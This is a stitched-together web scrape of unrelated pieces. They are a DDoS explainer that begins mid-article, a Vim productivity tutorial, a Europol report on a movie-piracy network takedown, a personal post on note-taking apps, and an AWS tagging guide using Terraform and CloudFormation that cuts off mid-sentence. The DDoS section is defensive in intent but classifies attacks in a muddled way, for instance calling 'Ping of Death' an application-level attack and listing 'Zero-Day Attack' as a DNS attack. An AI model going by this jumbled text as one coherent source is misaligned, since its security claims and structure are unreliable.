<p>When these malicious actions achieve their goal, you can immediately determine this by failures in the server or the hosted resource. But there are several indirect signs that you can detect about a DDoS attack at the very beginning.</p>



<ul><li>Server software and OS start to fail frequently and clearly — hang, incorrectly shut down, and so on.</li><li>A sharply increased load on the server’s hardware capacity, which differs from the average daily indicators.</li><li>A rapid increase in incoming traffic on one or more ports.</li><li>Multiple duplicated client actions of the same type on the same resource (going to the site, uploading a file).</li><li>When analyzing logs (of user actions) of the server, firewall, or network devices, many requests of the same type from different sources to the same port or service were detected. You should be especially wary if the audience for requests differs sharply from the target audience for the site or service.</li></ul>



<h3>Classification of DDoS attacks</h3>



<p>Protocol offensive (transport level)</p>



<p>A DDoS attack is directed at the network layer of a server or web resource, often referred to as a network layer or transport layer attack. Its purpose is to overload tablespace on a firewall with a built-in security log, a central network, or a load-balancing system.</p>



<p>The most common DDoS method at the transport level is network flooding, creating a huge stream of dummy requests at different levels that the receiving node cannot physically handle.</p>



<p>During an attack, the number of requests increases so much that the device does not have enough resources to complete the first request. As a result, the flood maximally saturates the bandwidth and completely clogs all communication channels.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Protocol-offensive.jpg.webp" alt="Types of DDoS attacks" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Protocol-offensive.jpg.webp 1024w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Protocol-offensive-300x169.jpg.webp 300w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Protocol-offensive-768x432.jpg.webp 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>Common types of network flooding:</p>



<ul><li>HTTP — A mass of normal or encrypted HTTP messages is sent to the attacked server, clogging communication nodes.</li><li>ICMP — The attacker’s botnet overloads the victim’s host machine with service requests, to which it is required to provide echo responses.</li><li>SYN — These attacks affect one of the basic mechanisms of the TCP Protocol, known as the “triple handshake” principle (the “request-response” algorithm: SYN packet – SYN-ACK packet – ACK packet).</li><li>UDP — Random ports of the victim’s host machine are flooded with UDP packets, the responses to which overload network resources. A type of UDP flood directed to the DNS server is called a “DNS flood.”</li><li>MAC — Targets are network hardware whose ports are clogged with streams of&nbsp;“empty” packets with different MAC addresses.</li></ul>



<p>Attacks at the application level</p>



<p>These include such a common attack as “Ping of Death” — mass sending of ICMP packets of greater length to the victim’s computer, causing buffer overflow.</p>



<ul><li>DNS attacks</li></ul>



<p>The first group focuses on vulnerabilities in DNS server. These include such common types of cybercrimes as “Zero-Day Attack” and “Fast Flow.”</p>



<p>One of the most common types of DNS attacks is called DNS spoofing. In this type of attack, hackers replace the IP address in the server cache, redirecting the user to a fake page. During the transition, the criminal gets access to the user’s personal data and can use it to their advantage.&nbsp;</p>



<p>For example, in 2009, because of DNS spoofing, users could not log in to Twitter for an hour. This attack was political. Iranian attackers redirected users to warnings related to American aggression.</p>



<p>The second type of DNS attack is the DDoS attacks that cause DNS servers to fail. If they fail, the user will not go to the desired page, because the browser will not find the IP address specific to the site.</p>

<h3>How to trace a DDoS attack?</h3>



<p>How do you know that your site has been attacked? There are <a href="https://www.darkreading.com/attacks-breaches/how-to-trace-a-ddos-attack/d/d-id/1129036" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">several signs</a> such as the error 503 of HTTP and the wrong usage of bandwidth.</p>



<p>To make sure if your site has been attacked, just log into your account and open Cpanel (a web hosting&nbsp;control&nbsp;panel). At the end of the page you’ll find the “Logs section,” where you should select “Bandwidth.”</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/prevent-DDoS-attacks.jpg.webp" alt="The method of how to trace a DDoS attack" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/prevent-DDoS-attacks.jpg.webp 1024w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/prevent-DDoS-attacks-300x169.jpg.webp 300w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/prevent-DDoS-attacks-768x432.jpg.webp 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>The next image that you can see has two scenarios:</p>



<p>Without an attack. When an attack has not occurred, the bandwidth graph for the last day looks like a relatively constant line, with several peaks.</p>



<p>With an attack. If your site has been hit by a DDoS attack, you will see a sharp jump in the bandwidth graph. This anomaly will be observed for more than an hour.</p>



<p>If you detect a DDoS attack, you should not waste a minute and act very quickly, since attacks consume a lot of network bandwidth, and can harm other clients as well.</p>



<p><em>-How to stop a DDoS attack?</em></p>



<p>Unfortunately, it is quite difficult to stop a DDoS attack. The best method is to contact your web hosting provider. It will block all HTTP requests that have been sent to your web server. This action helps to unload and close the server and prevents attacks on other clients.</p>



<p>Such an attack requires large hacker resources and usually last no more than one hour. So, you need to wait for the end of attack. However, after the attack is complete, you will be able to fully return to work.</p>

			                    <h2>Introduction</h2>
<p>If you're like me, you often re-Google Vim commands on the fly at the moment you realize you need them. For productivity's sake, it is worth practicing a few useful commands to turn them into habit. In this article, we'll discuss 7 versatile Vim commands that are easy to understand, use, and commit to memory.</p>
<h2>1. The dot command</h2>
<p>The <strong>dot command</strong> is a simple and powerful tool in Vim. It allows <em>repeating the last change</em> by pressing the <code>.</code> (period) key in Normal mode. This command is so versatile because "the last change" can mean many, many things, such as:</p>
<ul>
<li>Deleting one or more characters, words, or lines in Normal mode using <code>x</code>, <code>dw</code>, <code>d$</code>, <code>dd</code> or variations thereof.</li>
<li>Changing text indentation level using commands like <code>&gt;&gt;</code>, <code>&lt;&lt;</code>, or variations thereof.</li>
<li>Adding text in insert mode (between pressing <code>i</code> to get into Insert mode and <code>ESC</code> to exit insert mode).</li>
</ul>
<p>In general, executing any command in Normal mode that changes the text in your active file (or <strong>buffer</strong> as it is called in Vim), can be replayed using the dot command.</p>
<p>When repeating changes made in Insert mode, the change will be repeated using <em>the same command that was used to enter Insert mode</em>. For example, if Insert mode was entered using the <code>i</code> command, the text will be placed <em>before the cursor</em> when repeated using the dot command. If Insert mode was entered using the <code>a</code> command, it will be placed <em>after the cursor</em> when repeated using the dot command. Similarly, text inserted using the <code>I</code> and <code>A</code> commands gets repeated at the beginning and end of the line by the dot command, respectively.</p>
<p>Since <strong>motions</strong> (commands that move the cursor around in Vim) don't change anything, they cannot be replayed using the dot command. <em>However</em>, like most commands in Vim, the dot command can be prefixed with a number which tells Vim to execute it that many times. For example typing <code>5.</code> will repeat the last change 5 times.</p>
<p><strong>Less memorizable BONUS</strong>: Type <code>@:</code> in Normal mode to repeat the last Command mode command (i.e. the kind where you type a colon which brings the cursor to the bottom of the screen to enter something like <code>:some-command</code>). This one isn't as easy to memorize, but hey, at least you know it exists now.</p>
<h2>2. Mark a location within a file</h2>
<p>Next, we'll discuss a convenient feature that allows us to mark the current location in a file so that we can easily jump back to it later in the editing session. This is especially useful in long code files in which we need to frequently jump back and forth to make edits.</p>
<p>Marks are set in Normal mode. We can set a mark on the exact, current location of the cursor by typing <code>m</code> ("m" for "mark"!) followed by any lowercase letter. Therefore, we have 26 possible marks we can set and use at one time within each file.</p>
<p>We can jump back to that exact location by, (in Normal mode), typing a back-tick <code>`</code> followed by the lowercase letter used to create the mark. To help this one sink in, remember that the "back"-tick takes you "back" to the mark specified after it.</p>
<p>For example, if we create a mark using the command <code>mb</code>, we can jump to that location at any time using the command <code>`b</code>.</p>
<p>Double-tapping the back-tick key <code>``</code> will jump back to the location before the last jump. This is nice if you jump to a mark accidentally and want to get back to where you were working.</p>
<p>One last cool aspect of marks is that they persist on a per-file basis when you exit Vim with or without saving the buffer.</p>
<h2>3. Word autocompletion</h2>
<p>Another easy productivity boost can be obtained via Vim's built-in autocompletion feature. We will discuss the simplest version of this feature, which allows you to partially type a word (like a variable or function name), and tell Vim to pop up a list of autocompletion suggestions for you to choose from.</p>
<p>Vim's autocompletion list is triggered directly from Insert mode, since autocompletion shouldn't interrupt the flow of our writing too much. In Insert mode, start typing a word and then press <code>&lt;CTRL-n&gt;</code>. This will display a little pop-up list containing a list of words that match the part of the word we typed so far:</p>
<p><img src="https://initialcommit.com/img/blog/7-versatile-vim-commands-1.png" alt="Vim autocompletion word list" title="Vim autocompletion word list">
</p>
<p>This word list is generated <em>only from existing words in the current file</em>, so it is great for autocompleting things like long variable and function names.</p>
<p>You can toggle down the list of words by pressing <code>&lt;CTRL-n&gt;</code> to highlight the desired word, and then simply keep typing to continue your sentence without delay.</p>
<p>Fun fact - you can use <code>&lt;CTRL-p&gt;</code> to toggle backward through the word list, but that's an extra thing to remember which defeats the purpose of this article, so pretend I never said anything.</p>
<p><strong>Less memorizable BONUS</strong>: Instead of sourcing word lists for autocompletion from the current file, we can source them from Vim's built-in dictionary. To do this, first enable Vim's spellchecker by running <code>:set spell</code>. You might see some text highlighting - ignore it. Now when you're ready to autocomplete a word in Insert mode, instead of typing <code>&lt;CTRL-n&gt;</code>, type <code>&lt;CTRL-x&gt;&lt;CTRL-k&gt;</code>. This will source the autocompletion list from Vim's dictionary and present you with many more options, which can be good on the off change you're trying to write a real word.</p>
<h2>4. Simple arithmetic</h2>
<p>This one will be short and sweet. If Vim's cursor is positioned on top of a number in an open file, we can press <code>&lt;CTRL-a&gt;</code> ("a" for "add"!) to increment that number by 1 and <code>&lt;CTRL-x&gt;</code> to decrement that number by 1.</p>
<p>Typing a number before either of these commands will run it multiple times. For example, typing <code>5&lt;CTRL-x&gt;</code> will subtract 5 from that number.</p>
<p>If the cursor is not positioned directly on top of a number, the <code>&lt;CTRL-a&gt;</code> and <code>&lt;CTRL-x&gt;</code> commands will jump forward to the next occurrence of a number in the file and increment or decrement it accordingly.</p>
<p>Flashback to (1): The dot command can be used to repeat these addition and subtraction operations.</p>
<h2>5. Jump to the command-line without exiting Vim</h2>
<p>We can run any command from the command-line without exiting Vim. From Normal mode we can type a colon to enter Command mode followed by an exclamation point, followed by our terminal command. From Normal mode, we would type something like <code>:!ls</code>. This would display the command-line (keeping our Vim buffer open in the background), and list the contents of the current directory. As soon as we press a key, we are returned to our Vim file so we can continue working where we left off. Any command-line operation can be executed in this way.</p>
<h2>6. Using the buffer list</h2>
<p>Although most of us probably work on one file at a time in Vim, we can boost productivity by learning to make use of Vim's multi-file capabilities.</p>
<p>Previously, we mentioned the term <strong>buffer</strong>. When we open a file with Vim, we aren't working directly on the file itself. Instead we're working on an in-memory representation of that file, called a buffer. Most commands operate directly on the buffer, which gets written back to the file when we save the buffer.</p>
<p>Vim allows us to open multiple buffers in the same session. Try opening two files at once like this <code>vim file1.ext file2.ext</code>.</p>
<p>Vim will create and open a buffer for the first file listed, but in the background, a buffer for the second file is also created. You can prove this to yourself by running the <code>:ls</code> command in Vim which will list the open buffers. You can open as many files as you want this way, specifying wildcards like <code>vim *.java</code> if your heart desires it.</p>
<p>Use the commands <code>:bnext</code> ("buffer-next") and <code>:bprev</code> ("buffer-previous") to toggle forwards and backwards between your open buffers. You can treat each buffer as a regular old Vim session.</p>
<h2>7. Splitting windows</h2>
<p>Splitting windows is a step beyond using multiple buffers, because it allows you to see the contents of multiple files at the same time. Think of splitting windows as a frontend for viewing and working with multiple buffers at once.</p>
<p>If you're like me, you've probably split windows in Vim in the past, few and far between. And you probably always forget how to do it and are too lazy to look it up in the moment. Consider this an attempt to hammer it into your head - it's pretty dang simple:</p>
<ul>
<li>
<p>When you have a file open in Normal mode, use the command <code>:split file.ext</code> to create a <em>horizontal split</em> in the current window, displaying both the old and new files one above the other.</p>
</li>
<li>
<p>Use the command <code>:vsplit [file.ext]</code> to create a <em>vertical split</em> in the window, displaying both the old and new files side by side.</p>
</li>
<li>
<p>In Normal mode, press <code>&lt;CTRL-w&gt;w</code> (that means just press CTRL and tap 'w' twice) to toggle the active window.</p>
</li>
<li>
<p>Use the <code>:q</code> or <code>:wq</code> command to close out of the active window, which will allow the other window to take up the full screen.</p>
</li>
</ul>
<p>Fun fact - windows can be split and re-split multiple times - knock yourself out!</p>
<p><strong>Less memorizable BONUS</strong>: To lock scrolling for split windows so they scroll together, run the command <code>:set scrollbind</code> in each of them.</p>
<h2>Conclusion</h2>
<p>Vim's productivity is diminished if we have to constantly consult Google while working. We presented 7 Vim commands that are easy to commit to memory and will pay dividends in time-saved down the line.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>On 25 August, an alleged criminal network of copyright infringing hackers, mainly responsible for pirating movies and hosting illegal digital content worldwide was dismantled in a coordinated action between US authorities and their counterparts in 18 countries around the world, with Europol and Eurojust support. Sixty servers were taken down in North America, Europe and Asia and several of the main suspects were arrested.</p>
<h3>Streamed prior to release&nbsp;</h3>
<p>The Sparks Group obtained DVDs and Blu-ray discs of unreleased content and compromised the copyright protections on the discs to reproduce and upload the content publically to online servers. It is believed that the piracy group, under investigation since September 2016, had successfully reproduced and disseminated hundreds of movies and TV programmes prior to their retail release date, including nearly every movie released by major production studios in the US. The Sparks Group has caused tens of millions of US dollars in losses to film production studios, mainly to the US movie, television, and supporting industries, from the copyright infringement.&nbsp;</p>
<h3>False claims for free films</h3>
<p>To get ahead, members of the Sparks Group made several material misrepresentations and omissions to wholesale distributors. On many occasions, they claimed to be DVD and Blu-ray discs retailers and promised not to sell the content prior to the retail release date. Once they received the products, the members of the group used special software to crack the copyright protections to then reproduce and encode the content in high-definition. The content was then disseminated and reproduced on streaming platforms, peer-to-peer and torrent networks from their platforms.&nbsp;</p>
<p>The servers were located around the world in Canada, Czechia, Denmark, France, Germany, Latvia, the Netherlands, Norway, Poland, Portugal, Romania, South Korea, Spain, Sweden, Switzerland, and the United Kingdom. These were taken down in yesterday’s action and in the days preceding it, with the help of national authorities from these countries. Other measures were also taken in Italy, Romania and Canada. One of the members of the alleged criminal network was arrested over the weekend in Cyprus and another suspect was arrested yesterday in the US. &nbsp;</p>
<h3>International cooperation</h3>
<p>This successful operation was possible thanks to the extensive international cooperation facilitated by Europol and Eurojust between law enforcement and judicial authorities from the countries involved. Europol enhanced the exchange of information through the participating countries and coordinated the action day with Eurojust which hosted yesterday’s a coordination centre, ensuring real-time coordination in the joint action of the national authorities in all the countries. An operational meeting at Europol and a coordination meeting at Eurojust were organised prior to the joint action day, facilitating the exchange of information between law enforcement and judicial authorities and setting a joint strategy between all the parties involved. Europol provided analytical support during the investigation and supported the information exchange between the involved police authorities via the SIENA secure communication system.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Notion: My Life OS</h2><p>As far as flexibility and personalization, Notion takes the cake. Unlike Evernote, each page in Notion is composed of blocks – blocks that can be uniquely shaped and created to do exactly what you want them to do.<br></p><p>Want a bullet point? Add a block. Need a checkbox? Add a block. Want to make an H1 heading? You guessed it, another block.<br></p><p>Everything in my Notion revolves around my Life Dashboard. The dashboard is a compilation of linked pages for different areas of my life such as my Youtube channel, my weekly Newsletter, and freelance video editing.<br></p><p>Along with my life silos, I have pages created for projects that I’m working on, a master database for all the books I’m either currently reading or have read, and a master goals page.&nbsp;<br></p><p>&nbsp;I use my dashboard as a landing page for my life. Whenever I need to access some notes, figure out what video to make, or blog post to write next, I navigate to my dashboard and begin cranking out work like a productivity grease monkey.<br></p><h2>Obsidian: Live Notes &amp; Ideas</h2><p>Obsidian is the holding tank for all my notes on articles, books, podcasts, and ideas. Obsidian’s structure, or lack thereof, makes it easy to link notes together manually or automatically with the backlink functionality.<br></p><p>&nbsp;A typical article will have anywhere from 5 to 30 backlinks, depending on its length. I backlink most nouns such as companies, names, and key terms. Doing so adds a unique function that most note taking apps can’t give – serendipity. Let me explain.<br></p><p>If I’m taking notes on an article written by David Perell that mentions the key terms Gardner, Librarian, and Architect, I will most likely back link each of those. When I click into each key terms page and show backlinks, I see the reference that David Perell made to it. However, because I took notes on that exact topic on a different article from Ness Labs, those notes will show there as well.<br></p><p>I now have two different sources talking about the same topic in my personal wiki. From here, I can read both articles and synthesize, or try and create my own take on the Gardner, Architect, Librarian philosophy. This doesn’t typically happen in rigid note taking apps such as Evernote or OneNote unless you manually think, “Ah, these two terms are related.”</p><h2>Evernote: Set it and Forget it</h2><p>Evernote, or as I like to call it, ‘Ol Reliable.&nbsp;<br></p><p>Evernote has been around a long time, and, along with Word, Evernote made massive waves in the Personal Knowledge/Information Management field. Founded in 2004, it was one of the first companies to adopt smartphone operating procedures. Within a few years, Evernote was seeing incredible success and <a href="https://www.nytimes.com/2019/06/28/business/evernote-what-happened.html">most thought they were headed</a> toward a great IPO.<br></p><p>Because it has been around so long, people depend on Evernote to store a plethora of information, which it does quite well. However, the hierarchical structure of Evernote makes it hard to manipulate notes like in Obsidian. Additionally, its rigid format doesn’t allow for the same degree of personalization as Notion.<br></p><p>Although I use both Obsidian and Notion already, I do use Evernote as well. Evernote has insanely accurate Optical Character Recognition (OCR for short), which makes it a great tool to store important documents or receipts.&nbsp;<br></p><p>OCR means Evernote can search the actual text on a PDF or JPEG, instead of just searching the text that was written in the program like Notion or Obsidian do. This makes it invaluable to store house documents, receipts you might not want to throw away, or handbooks you want to get out of storage; this is exactly what I use Evernote for.<br></p><p>When you signing up, Evernote creates a custom email for each user. When emails or attachments are sent to this email, they automatically appear in the Inbox section of Evernote. From there, you can drag and drop the file to the appropriate folder. This has been game changing in regards to getting all my important docs saved because I can easily snap a photo on my phone, use the text expander feature on IOS to get my Evernote email address, and it’s on it’s way.&nbsp;<br></p><div><p>Thomas Edison would lose his mind if he had these features when inventing that lightbulb.</p></div><h3><strong>Task Manager/Reminders</strong></h3><p>The best feature in any task manager is quick capture. Think, “quick capture is queen”. That’s why I use Things3.<br></p><h2>Things3: Basically Wizardry</h2><p>Things3 is an <em>incredible </em>task manager. Its quick capture feature, its automatic imports from reminders, its ability to add different projects and areas, and its inbox/today view blow any other task manager out of the water.<br></p><p>I use Things3 as a quick capture tool when I’m at my desk or anywhere else on my laptop. If I come across an article I want to read, a video I want to watch, or a company I want to research, instead of doing that in the moment and ruining the flow of work, I add a new task to my inbox.<br></p><p>By simply pressing CTRL + SPACE, a small window in the center of the screen appears.

                <!-- Toc if any -->            
                
                <!-- End Toc -->
				

<p>Once <a href="https://www.cloudforecast.io/blog/aws-tagging-best-practices/" target="_blank">you have adopted an AWS tagging strategy</a>, you’ll need to make sure that all your existing AWS resources and any new ones you create abide by it. Consistency is the key - if you don’t proactively enforce your AWS tagging strategy, you’ll always be playing catch up and chasing down team members to make sure they add the right tags to their resources.</p>

<p>While you can apply AWS tags to your resources manually using the <a href="https://docs.aws.amazon.com/cli/latest/reference/resourcegroupstaggingapi/tag-resources.html" target="_blank">AWS CLI</a> or <a href="https://docs.aws.amazon.com/ARG/latest/userguide/tag-editor.html" target="_blank">AWS Tag Editor</a>, you’ll probably find this cumbersome and error-prone at scale. A better approach is to automatically apply AWS tags to your resources and use rules to enforce their consistent usage.</p>

<p>Depending on the tool you use to maintain your infrastructure on AWS, your method of proactively enforcing AWS tags on new resources may vary. In this guide, I’ll highlight two tools: Terraform and AWS CloudFormation. You’ll see how to use each to create and update AWS cost allocation tags on your resources and then enforce the proper use of specific tags for new resources. By proactively enforcing your AWS tagging strategy, you’ll minimize your time spent auditing and correcting improper AWS tags and force developers to learn best AWS tagging best practices for your environment.</p>



<p>The first infrastructure management tool I’ll cover is <a href="https://www.terraform.io/" target="_blank">Terraform</a>. Terraform works across a variety of cloud hosting providers to help you provision and maintain your AWS resources. With Terraform, you can define your servers, databases, and networks in code and apply your changes programmatically to your AWS account.</p>

<p>If you’re new to Terraform, they have a well-documented <a href="https://learn.hashicorp.com/terraform/getting-started/intro" target="_blank">Getting Started guide</a> and several <a href="https://github.com/terraform-providers/terraform-provider-aws/tree/master/examples" target="_blank">AWS template examples on GitHub</a>. In this section, I’ll show you some snippets from a demo Terraform project and module that <a href="https://github.com/CloudForecast/cf-terraform-demo" target="_blank">is available on GitHub</a>. You’ll learn the following in this Terraform AWS tags:</p>

<ol>
  <li>Tag a New AWS EC2 Instance with Terraform</li>
  <li>Using Terraform to Update Existing AWS Tags</li>
  <li>Enforce AWS Tags with Terraform</li>
</ol>

<h3 id="tag-a-new-aws-ec2-instance-with-terraform">Tag a New AWS EC2 Instance with Terraform</h3>

<p>If you want to deploy an EC2 instance with AWS Tags using Terraform, your configuration might include something like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td><pre>resource "aws_instance" "cart" {
  connection {
    type = "ssh"
    user = "ubuntu"
    host = self.public_ip
    private_key = file(var.private_key_path)
  }

  instance_type = "t2.micro"

  ami = var.aws_amis[var.aws_region]

  key_name = aws_key_pair.auth.key_name

  vpc_security_group_ids = [aws_security_group.default.id]

  subnet_id = aws_subnet.default.id

  provisioner "remote-exec" {
    inline = [
      "sudo apt-get -y update",
      "sudo apt-get -y install nginx",
      "sudo service nginx start",
    ]
  }
  tags = {
    contact = "j-mark"
    env = "dev"
    service = "cart"
  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The above example includes three AWS cost allocation tags: <code>contact</code>, <code>env</code>, and <code>service</code> with values described as strings. When you <a href="https://www.terraform.io/docs/commands/apply.html" target="_blank">apply this configuration</a>, Terraform will connect to AWS and deploy an EC2 instance having the AWS tags you specified.</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383259429_cf-2020-08-02-a.png" alt=""></p>

<h3 id="using-terraform-to-update-existing-aws-tags">Using Terraform to Update Existing AWS Tags</h3>

<p>Terraform makes it easy to update already existing resources with AWS tags in reversible and consistent ways. If you’re using AWS tags to keep track of a resource’s contact (e.g.: <code>j-mark</code> in the above example), you’re likely to need to update the AWS tag when the team member leaves or changes roles.</p>

<p>To update the AWS tags on your resource, simply update the corresponding tags in your Terraform configuration. The new tags will overwrite any previous tags assigned to the resource, including tags added outside of Terraform.</p>

<p>For example, to change the <code>contact</code> cost allocation tag on the EC2 instance above, you might update the <code>tags</code> block above with the following:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>tags = {
  contact = "l-duke"
  env = "dev"
  service = "cart"
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>When you apply this configuration, the AWS tags will be automatically updated in the AWS console:</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383277121_cf-2020-08-02-b.png" alt=""></p>

<p>If you keep your Terraform configuration files in version control - which is probably a good idea - you will be able to see how tags have changed over time. You can also review changes using the same code review process that your application code goes through to help you catch mistakes in the execution of your tagging strategy.</p>

<h3 id="enforce-aws-tags-with-terraform">Enforce AWS Tags with Terraform</h3>

<p>As your infrastructure grows, a code review process likely won’t be enough to prevent improper AWS tagging. Fortunately, you can enforce AWS tag names and values using <a href="https://www.terraform.io/docs/configuration/variables.html" target="_blank">variables</a> and custom validation rules in Terraform.</p>

<p>In the examples above, the <code>tags</code> list was hard-coded into the EC2 instance definition. A more scalable pattern would be to break your EC2 instance template into its own <a href="https://www.terraform.io/docs/configuration/modules.html" target="_blank">module</a> and use a <code>tags</code> variable. You can then write a <a href="https://www.terraform.io/docs/configuration/variables.html#custom-validation-rules" target="_blank">custom validation rule</a> to check that the tags comply with your strategy.</p>

<p>For example, if you want to check that:</p>

<ol>
  <li>The user specifies at least one tag</li>
  <li>The <code>contact</code> tag is either <code>j-mark</code> or <code>l-duke</code></li>
  <li>The <code>env</code> tag is set</li>
  <li>The <code>service</code> tag is either <code>cart</code> or <code>search</code></li>
</ol>

<p>You might create a module with a variable specified like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre>variable "tags" {
  description = "The tags for this resource."
  validation {
    condition = length(var.tags) &gt; 0 &amp;&amp; contains(["j-mark", "l-duke"], var.tags.contact) &amp;&amp; var.tags.env != null &amp;&amp; contains(["cart", "search", "cart:search"], var.tags.service)
    error_message = "Invalid resource tags applied."

  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now when you run <code>terraform plan</code> with a missing or invalid tag, you’ll get an error:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>Error: Invalid value for variable
...
Invalid resource tags applied.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Your rules can be as complex as <a href="https://www.terraform.io/docs/configuration/index.html" target="_blank">Terraform’s Configuration Language</a> allows, so functions like <code>regex()</code>, <code>substr()</code>, and <code>distinct()</code> are all available. That said, there are some caveats to this approach.</p>

<p>First, custom variable validation is an experimental feature in Terraform. <a href="https://www.terraform.io/docs/configuration/terraform.html#experimental-language-features" target="_blank">Experimental features</a> are subject to change, meaning that you might need to pay attention to Terraform update mores closely. To enable <code>variable_validation</code>, add the following to your <code>terraform</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>terraform {
  experiments = [variable_validation]
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Second, Terraform’s variable validation only happens during the <code>terraform plan</code> phase of your infrastructure’s lifecycle. It can’t prevent users from accidentally changing your tags directly in the AWS console, and it’s only as good as the validation rules you write. If you start using a new resource but forget to add validation rules, you might end up with lots of resources that don’t adhere to your tagging strategy.</p>

<p>Another option for paid Terraform Cloud customers is <a href="https://www.terraform.io/docs/cloud/sentinel/index.html" target="_blank">Sentinel</a>, which allows you to create custom policies for your resources. I won’t cover this method here, but Terraform has created an <a href="https://www.terraform.io/docs/cloud/sentinel/examples.html" target="_blank">example policy</a> to show you how to enforce mandatory AWS tags.</p>



<p>Similar to Terraform, AWS <a href="https://aws.amazon.com/cloudformation/" target="_blank">CloudFormation</a> lets you provision AWS resources based on configuration files. Unlike Terraform, CloudFormation is part of Amazon’s offerings, so it won’t necessarily help you if you want to use another infrastructure provider. The approach to tagging your resources in CloudFormation is similar to that used by Terraform, but as you’ll see, the configuration format is different.</p>

<p>If you’re new to AWS CloudFormation, <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/GettingStarted.Walkthrough.html" target="_blank">Amazon’s official walkthrough</a> will help you get started deploying some basic templates. In this section, I’ll show you some snippets from a demo AWS CloudFormation template which is <a href="https://github.com/CloudForecast/cf-cloudformation-demo" target="_blank">also available on GitHub</a>. You’ll learn the following in this Terraform AWS tags section:</p>

<ol>
  <li>AWS CloudFormation Template to Deploy Tags</li>
  <li>Using CloudFormation to Update AWS Tags</li>
  <li>CloudFormation Template to Enforce AWS Tags</li>
</ol>

<h3 id="aws-cloudformation-template-to-deploy-tags">AWS CloudFormation Template to Deploy Tags</h3>

<p>AWS CloudFormation is designed to make it easy to create AWS resources with a single template file. Using a CloudFormation template, every resource that can be deployed with an AWS tag.</p>

<p>For example, to create a new EC2 instance with the same three AWS tags used in the Terraform example above, add an array of <code>Tags</code> to the resource’s <code>Properties</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9

11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td><pre>"Resources" : {
  "WebServerInstance": {  
    "Type": "AWS::EC2::Instance",
    "Metadata" : {...},
    "Properties": {
      "Tags" : [
       {
          "Key" : "contact",
          "Value" : "j-mark"
       },
       {
          "Key" : "env",
          "Value" : "dev"
       },
       {
          "Key" : "service",
          "Value" : "cart"
       }
      ],
      ...       
    }
  },
  ...         
},
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using <a href="https://aws.amazon.com/cli/" target="_blank">AWS CLI</a>, you can <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/create-stack.html" target="_blank">deploy this CloudFormation template as a new stack</a>. This will ensure your template is valid and create the specified resources with their tags on AWS:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you have lots of similar resources in your template, you can deploy AWS tags to all the resources in the stack at once using the <code>--tags</code>  flag with the <code>create-stack</code> or <code>update-stack</code> commands:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre># Creating a stack with tags
aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"

# Updating a stack with tags
aws cloudformation update-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="using-cloudformation-to-update-aws-tags">Using CloudFormation to Update AWS Tags</h3>

<p>If you want to change the contact on your EC2 instance created above, simply change the <code>Tags</code> section of your template file and use the <code>[update-stack](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html)</code> <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html" target="_blank">command</a> to deploy your changes.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre>"Tags" : [
 {
    "Key" : "contact",
    "Value" : "l-duke"
 },
  ...
],
</pre></td></tr></tbody></table></code></pre></div></div>

<p>AWS CloudFormation behaves the same way that Terraform does when you update tags outside your template file. Any tags set manually will be overridden by the <code>update-stack</code> …</p></div></div>

